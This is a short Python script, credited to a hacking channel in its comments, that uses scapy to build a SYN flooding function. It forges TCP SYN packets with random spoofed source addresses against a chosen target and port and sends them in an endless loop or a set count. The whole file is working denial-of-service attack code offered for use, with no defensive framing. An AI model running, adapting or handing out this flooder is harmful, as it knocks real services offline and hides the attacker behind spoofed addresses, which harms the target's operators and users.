#! /usr/bin/env python3
# Channel RemaxBoxTeam
# lhashashinl <--M-->
from scapy.all import *
from scapy import *
import socket


def SynFlooding(Target,port,message,count=False):
    ipm = RandIP()
    ip = IP(src=RandIP(),dst=f"{Target}",id=1111,ttl=99)
    tcp = TCP(sport=RandShort(),dport=port,seq=12345,ack=1000,window=1000,flags="S")
    pyload = ip/tcp/f"{message}"
    if count == False:
        send(pyload,loop=1,verbose=0)
    else:
        send(pyload,count=count,verbose=0)
    return pyload

